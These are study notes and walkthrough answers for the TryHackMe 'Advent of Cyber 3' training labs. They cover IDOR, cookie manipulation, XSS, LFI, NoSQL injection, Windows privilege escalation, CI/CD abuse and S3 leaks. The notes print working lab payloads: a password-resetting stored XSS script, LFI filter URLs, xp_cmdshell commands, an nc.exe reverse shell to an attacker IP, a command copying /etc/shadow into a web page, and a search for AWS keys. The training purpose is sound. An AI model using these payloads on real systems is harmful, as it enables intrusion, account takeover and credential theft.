# Room
https://tryhackme.com/room/adventofcyber3

# Task 1 - Intro
Intro

# Task 2 - Socials
Socials

# Task 3 - Swag
Swag

https://store.tryhackme.com/

# Task 4 - Rules
Rules

# Task 5 - Story
McSkidy is back, yeah!

# Task 6 - Day 1 - Web Exploitation / Save the Gifts
1. What is an IDOR vulnerability
   * IDOR - Insecure Direct Object Reference
   * an access control vulnerability
   * when an attacker gains access to information not intended for them
2. How to find IDOR vulnerabilities
   * found by changing user supplied data
   * change components in a request or cookie
3. IDOR challenge walkthrough
   * In the challenge change the user_id parameter to find and answer questions

# Task 7 - Day 2 - Web Exploitation / Elf HR Problems
1. HTTP
   * HTTP = Hypertext Transfer Protocol
   * HTTP is a client-server protocol used between a client and a web server
   * HTTP is a request response protocol
   * HTTP is stateless
   * A few HTTP methods include
     * GET - client requests content from a server
     * HEAD - similar to get but retrieves just the header
     * POST - client submits content to a server
     * PUT - replaces all representations of the target resource with the PUT request
2. Cookies
   * Cookies allow the stateless HTTP protocol to identify users and provide access control, among other things
   * A cookie is a piece of session metadata that resides on the client device
   * Cookies are set in the response portion of the conversation by the server
   * Cookies are sent by the client to present state and identify it as previously authenticated
   * Cookies typically are serialized in JSON format
   * A few cookie components include
     * Name - unique name
     * Value - unique value to help track state
     * Domain - web domain that the cookie is used in (scope)
     * Path - local path to the cookie
    * Manipulation
      * Cookie manipulation is an attack used to obtain unintended behavior from the target
3. Cookie manipulation example
   * Obtain cookie
   * Decode cookie
   * Identify cookie structure
   * Decode/change paramters of the cookie
   * Encode the cookie with the manipulated values
   * Refresh the web page or use the manipulated cookie in your request/script
4. Cookie manipulation challenge
   * Load the challenge web site.  Open developer tools.  Refresh the page.  Go to Storage > Cookies tab in developer tools.  Grab the cookie value and manipulate it based on the challenge to gain admin access.  One useful tool for this is https://gchq.github.io

# Task 8 - Day 3 - Web Exploitation / Christmas Blackout
1. Content Discovery
   * Content = assets and inner workings of the application: files, folders, pathways
   * Content Discovery - find things we aren't supposed to see normally: config files, passwords, backups, etc
2. Discovering Content
   * Manually - manually traverse a file system looking for items of interest
   * With Tools - use tools such as dirbuster and gobuster to help discover valuable assets
3. Default Credentials
   * Apps and services often come with default credentials enabled, you can exploit this
4. Challenge
   * Use a tool to find the admin page
   ```
   gobuster dir -w directory-list-lowercase-2.3-big.txt -u http://10.10.227.249
   ```
   * Use default creds to access the admin page
   * Find the flag

# Task 9 - Day 4 - Web Exploitation / Santa's Running Behind
1. Authentication
   * Authentication - process of verifying a user's identity
   * Proven via username and password, tokens, biometrics
   * Authentication is not Authorization, Authorization is what permissions are granted to the authenticated session
2. Fuzzing
   * Fuzzing - automated means of testing an element of a web app
   * Tools to perform fuzzing - Burp Suite, ffuf
3. Challenge
   * Load the web page from the challenge.  Launch Burp.  Click the Proxy tab and make sure the "Intercept is on" button is enabled (default).  In the web browser use FoxyProxy to proxy requests to Burp.  In the web page enter bogus login information and submit.  In Burp the POST request is held, right click and choose "Send to Intruder".  Click the Intruder tab.  In the Intruder tab click the Positions tab.  Clear out the positions with the clear button.  Highlight your bogus password and click the add button.  Change attack type to Sniper.  Go to the Payloads tab.  Ensure Payload set 1 is selected.  Click the Load button in Payload Options and find the wordlist in the /root folder.  Click Start Attack.

# Task 10 - Day 5 - Web Exploitation / Pesky Elf Forum
1. What is an XSS vulnerability
   * XSS = Cross Site Scripting
   * An injection attack where malicious JavaScript is injected into a web application
   * Steal cookies, install a key logger, redirect, and more
2. Types of XSS Vulnerabilities
   * DOM = Document Object Model
      * Programming interface for HTML and XML
      * Allows programs to change document structure
      * JavaScript execution happens directly in the browser
   * Reflected
      * Occurs when user supplied data in an HTTP request is included in the web page without any validation
   * Stored
      * The XSS payload is stored on the server
      * Executed whenever other users visit the page
   * Blind
      * Similar to Stored
      * You can't see the results of the payload
3. Challenge
   * Load the web page from the challenge.  Login with the provided credentials.  Examine the settings page and try to reset your password.  Notice that the password is now displayed in the URL.  Navigate to the forum and pick a thread to leave a comment on.  Next leave a comment with an HTML tag like <b>, does it show up and execute? Next leave a comment with a script tag using the password URL from the previous step : <script>fetch('/settings?new_password=pass123');</script>.  Submit the comment and then view the page source.  If the script tags are intact, you have successfully injected a Stored XSS.  Anyone that visits the page will have their password reset to pass123.  Login as the grinch with pass123.  Disable Buttmas.

# Task 11 - Day 6 - Web Exploitation / Patch Management is Hard
1. What is an LFI vulnerability
   * LFI = Local File Inclusion
   * a web app vulnerability that allows an attacker to include and read local files on the server
   * caused by lack of secure code and no input validation
2. Risks of LFI
   * ability to read sensitive files
   * can be chained to perform an RCE - Remote Code Execution
3. Identifying and testing for LFI
   * attackers are interested in HTTP parameters
   * HTTP parameters can be manipulated to inject attack payloads
   * some entry points can be found in HTTP GET or POST requests
4. Exploiting LFI
   * exploitation depends on the web app configuration
5. PHP filter
   * used in LFI to read the PHP page content
6. PHP DATA
   * used to include raw plaintext or base64 encoded data
7. Challenge
   * Load the web page from the challenge and explore various LFI vulnerabilities.  You will need to decode base64 encoded text to grab a credential filename and login credentials.
   ```
   http://10.10.161.76/index.php?err=/etc/flag

   http://10.10.161.76/index.php?err=php://filter/convert.base64-encode/resource=index.php

   http://10.10.161.76/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php
   ```

# Task 12 - Day 7 - Web Exploitation / Migration without security
1. NoSQL
   * a non relational database
   * a data storing and retrieving system
   * used for powerful features like fast queries, use of use to devs, and scaling
2. Understanding NoSQL
   * Examples: MongoDB, Couchbase, RavenDB
   * constructs
      * collections - similar to tables or views
      * documents - similar to rows or records
      * fields - similar to columns
   * MongoDB objects stored in a format called BSON - binary JSON
      * JSON - JavaScript Object Notation - interchange format that is easy for humans to read and write
   * MongoDB comparison operators
      * $and
      * $or
      * $eq
   * MongoDB connection example
      ```
      ssh thm@ip -p 2222
      mongo
      show databases
      use AoC3
      db.createCollection("users")
      db.createCollection("roles")
      db.getCollectionNames()
      db.users.insert({id:"1", username: "admin", email: "admin@thm.labs", password: "idk2021!"})
      db.users.insert({id:"2", username: "user", email: "user@thm.labs", password: "password1!"})
      db.users.find()
      db.users.update({id:"2"}, {$set: {username: "tryhackme"}});
      db.users.find()
      db.users.remove({'id':'2'})
      db.users.find()
      db.users.drop()
      ```
   * MongoDB check for the flag
      ```
      show databases
      use flagdb
      show collections
      db.flagColl.find()
      ```
3. NoSQL Injection
   * allows an attacker to have control over the database
   * send queries via untrusted and unfiltered application input

4. Bypass login pages
   * simple login process: connect to db and look for username/password, if exists proceed, else deny login
   * operators common in injection
      * $eq - matches records equal to a certain value
      * $ne - matches records that are not equal to a certain value
      * $gt - matches records that are greater than a certain value
      * $where - matches records based on JavaScript condition
      * $exists - matches records that have a certain field
      * $regex - matches records that satisfy certain regular expressions
   * operator injection example 1
      ```
      db.users.findOne({username: "admin", password: {"$ne":"xyz"}})
      ```
   * operator injection example 2
      ```
      db.users.findOne({username:{"$ne":"admin"},password:{"$ne":"xyz"}})
      ```
5. Exploting NoSQL injection
   * find an entry point that doesn't sanitize input
   * understand how requests are passed to the database: GET, POST, JSON, APIs
   * url injection example
      ```
      http://example.thm.labs/search?username=admin&role[$ne]=user
      ```
6. Challenge
   * Load the challenge web site in a browser.  Open Burp Suite and turn on intercept.  In the browser turn on FoxyProxy and attempt a login request.  For the first flag, login as the user admin and inject a not equals operator into the HTTP request password field.  After logging in with the admin user go to the gift search page.  Turn off FoxyProxy intercept for Burp.  Fiddle with the request URL to find all users that have a role of guest where you'll find the second flag.  Finally search gifts again for the user mcskidy to load only his record, there will be the last flag.
   ```
   username=admin&password[$ne]=test

   http://10.10.177.223/search?username[$ne]=test&role=guest

   http://10.10.177.223/search?username=mcskidy&role[$ne]=user
   ```

# Task 13 - Day 8 - Special by John Hammond / Santa's Bag of Toys
1. PowerShell Transcription Logs
   * PowerShell Transcription Logs can capture the input and output of PowerShell commands
   * It can be enabled in Group Policy or via the registry
   ```
   reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
   reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
   reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f
   ```
2. Walkthrough
   * Use the exported transcription logs from Santa's laptop to answer the challenge questions
   * Grab the base64 encoded certificate, use CyberChef to decode it and save to a dat file
   * Load Shellbags Explorer and open the export dat file
   * Using Shellbags explore the different folders and files
   * Search for the github repo found in the folder tree view
   * Explore the github repo to discover the password to the UHA archive
   * Open the UHA archive to view the files

# Task 14 - Day 9 - Networking / Where is all this data going
* Packet analysis is a technique used to capture, intercept, and analyze packets
* Tool names: packet sniffer, packet analyzer, protocol analyzer, network analyzer
* Software: Wireshark, tcpdump, netsh
* Work through the challenge using the attached task file and Wireshark as your analysis tool
* Challenge
   * Find HTTP GET requests : http.request.method == GET
   * Find HTTP POST requests : http.request.method == POST
   * Find DNS text messages : dns.txt
   * Find clear text FTP commands : ftp
   * Examine uploaded FTP data : ftp-data

# Task 15 - Day 10 - Networking / Offensive is the best defense
* Intro to IP addresses, protocols, and ports
* nmap basic flags
   * -sT : TCP connect scan, completes TCP 3-way handshake
   * -sS : TCP syn scan, sends syn, listens for response, does not complete TCP 3-way handshake
   * -sV : identify version of service running on a port
   * -p- : scan all ports
   * -p1-300 : scan ports 1 to 300

# Task 16 - Day 11 - Networking / Where are the reindeers
* MS SQL Intro
   * RDBMS - Relational Database Management Ssytem
   * Default port = 1433
* sqsh - sqsh is an interactive database shell
   * connecting to a db with sqsh : sqsh -S [ip address] -U [user] -P [password]
   * command cheatsheet: http://nellisks.com/ref/sybase/how_to.html
* Challenge
   * select * from reindeer.dbo.names;
   * go
   * select * from reindeer.dbo.schedule;
   * go
   * select * from reindeer.dbo.presents;
   * go
   * xp_cmdshell 'whoami';
   * go
   * xp_cmdshell 'dir c:\users';
   * go
   * xp_cmdshell 'type c:\test.txt';
   * go

# Task 17 - Day 12 - Networking / Sharing without caring
* Review the server sending unusual traffic
* Scan the target
   ```
   nmap -A -T4 -Pn 10.10.41.20
   ```
* NFS is running on the target, list the shares
   ```
   showmount -e 10.10.41.20
   ```
* Access a remote share
   ```
   cd /tmp
   mkdir tmp2
   mount 10.10.41.20:/confidential tmp2
   cd tmp2
   ls -lrta
   ```
* Grab the md5 sum of a file
   ```
   md5sum file.txt
   ```

# Task 18 - Day 13 - Networking / They lost the plan
* Windows Privileges
   * Domain Admins
   * Services
   * Domain Users
   * Local Accounts
* Windows Privilege Escalation Vectors
   * Stored creds
   * Kernel exploits
   * Insecure File/Folder permissions
   * Insecure permissions
   * DLL Hijacking
   * Unquoted service paths
   * Always install elevated
   * Other software
* Challenge
   * Connect to the target with an existing account
      ```
      xfreerdp /u:mcskidy /p:password /v:10.10.225.43
      ```
   * List users
      ```
      net users
      ```
   * Get current OS version
      ```
      systeminfo | findstr "OS Name"
      ```
   * Search services for anything related to backup software
      ```
      sc query | findstr NAME | findstr /i back
      ```
   * Grab details of the service you found
      ```
      wmic service list config | findstr /i ip
      ```
   * Launch the software and create a backup job and run it as a service, point it to a malicious bat file you created
      ```
      @echo off

      C:\Users\McSkidy\Downloads\nc.exe 10.12.34.56 1337 -e cmd.exe      
      ```
   * Start a listener on the attacking machine to catch the shell
      ```
      nc -nvlp 1337
      ```

# Task 19 - Day 14 - Networking / Dev(insecure)ops
* CI/CD Overview
   * CI - Continuous Integration - source code kept in central repo where everyone can work from
   * CD - Continuous Delivery - integral steps where code is automatically deployed to test, pre-prod, and prod
* CI/CD Risks
   * Access security
   * Permissions
   * Keys and secrets
   * User security
   * Default configurations
* Challenge
   * Use the default wordlist in dirb to discover assets on the target
      ```
      dirb http://10.10.101.1
      ```
   * SSH with the provided credentials and review the /home/thegrinch/scripts folder
   * Using the loot.sh file, modify it to grab /etc/shadow
      ```
      cat /etc/shadow > /var/www/html/ls.html
      ```
   * Using the loot.sh file, modify it to grab the flag in thegrinch's desktop
      ```
      cat /home/thegrinch/Desktop > /var/www/html/ls.html
      ```

# Task 20 - Day 15 - Cyber Careers
* Review Cyber Careers quiz

# Task 21 - Day 16 - OSINT / Ransomware Madness
* OSINT - Open Source Intelligence
* Two places to find information
   * Clearnet
      * Facebook
      * Twitter
      * GitHub
   * Darknet
      * TOR
      * Freenet
      * I2P
      * IPFS
      * Zeronet
* RIS Open Source Intelligence Cycle
   * https://arnoreuser.com/wp-content/uploads/2018/12/201712-The-RIS-OSINT-Intelligence-Cycle.pdf
   * 1 - Client
   * 2 - Source
   * 3 - Monitoring
   * 4 - Selecting/Finding
   * 5 - Acquisition
   * 6 - Indexing
   * 7 - Syntheses
   * 8 - Dissemination
* Google Dorking
   * https://www.sans.org/posters/google-hacking-and-defense-cheat-sheet/
* OSINT Challenge
   * Use Google to search for keywords in the ransomware message.  Track the user through various social media to answer the questions.

# Task 22 - Day 17 - Cloud / Elf Leaks
* AWS
   * cloud service provider
   * many regions
   * many services
* Gathering info on images.bestfestivalcompany.com
* Challenge
   * List files from bf
      ```
      aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
      ```
   * Grab flag from bf
      ```
      curl http://images.bestfestivalcompany.com.s3.amazonaws.com/flag.txt
      ```
   * Grab backup file from bf and unzip
      ```
      aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
      unzip wp-backup.zip
      ```
   * Search backup files for access keys, list contents
      ```
      cat * | grep -R AKIA
      cat wp-config.php | grep define
      ```
   * Create an AWS profile with the creds you found
      ```
      aws configure --profile bf
      ```
   * Grab account ID
      ```
      aws sts get-caller-identity --profile bf
      ```
   * List EC2 instances
      ```
      aws ec2 describe-instances --output table --profile bf      
      ```
   * List secrets
      ```
      aws secretsmanager list-secrets --profile bf
      ```

# Task 23 - Day 18 - Cloud / Playing with Containers
* Containers are a virtualization mechanism similar to virtual machines
* Docker is a container platform
* Docker terms
   * Docker API - local comm interface
   * Docker Daemon - process that runs on your machine
   * Docker Container Image Format - a tar file, image format and specifications
* Challenge
   * List local docker images
      ```
      docker images
      ```
   * Grab the challenge image and list it
      ```
      docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
      docker images
      ```
   * Run the challenge image
      ```
      docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest
      printenv
      exit
      ```
   * Create a temporary folder, download and investigate the challenge image
      ```
      mkdir aoc
      cd aoc/
      docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
      tar -xf aoc.tar
      apt install jq -y
      cat manifest.json | jq
      ```

# Task 24 - Day 19 - Blue Teaming / Something Phishy is going on
* Phishing checks
   * do you know the sender?
   * does the email greet you personally?
   * does the email contain grammar mistakes?
   * does the email give a sense of urgency?
   * does the email have weird links?
   * does the email have weird attachments?
* Challenge
   * Review the example email and answer the questions
   * Decode base64
      ```
      cat a.txt | base64 -d
      ```
   * Decode base64, save to file
      ```
      cat b.txt | base64 -d > file.pdf
      ```

# Task 25 - Day 20 - Blue Teaming / What's the worst that could happen?
* Malware analysis VM : https://remnux.org/
* File analysis
   * file [file]
   * strings [file]
   * md5sum [file]
* Virustotal : https://www.virustotal.com/gui/home/upload

# Task 26 - Day 21 - Blue Teaming / Needles in computer stacks
* YARA - multi platform tool for matching patterns of interest, used to identify malicious files
* List of rules: https://github.com/InQuest/awesome-yara
* yara rule
   * rulename
   * metadata
   * strings
   * conditions
* syntax
   * yara [yara_file]
* options
   * -m
   * -n